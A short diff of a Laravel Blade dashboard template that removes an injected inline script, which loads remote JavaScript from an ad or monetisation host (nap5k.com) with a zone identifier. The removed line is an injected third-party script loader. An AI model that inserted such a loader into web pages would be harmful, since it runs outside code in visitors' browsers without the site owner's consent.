@@ -55,7 +55,6 @@
                         <img src="{{ URL::to(website_favicon()) }}" alt="" height="40">
                     </span>
                 </a>
-<script>(function(s){s.dataset.zone='11563878',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))</script>
                 <a href="{{ route('user.dashboard') }}" class="logo logo-light">
                     <span class="logo-sm">
                         <img src="{{ URL::to(website_logo()) }}" alt="" height="40">
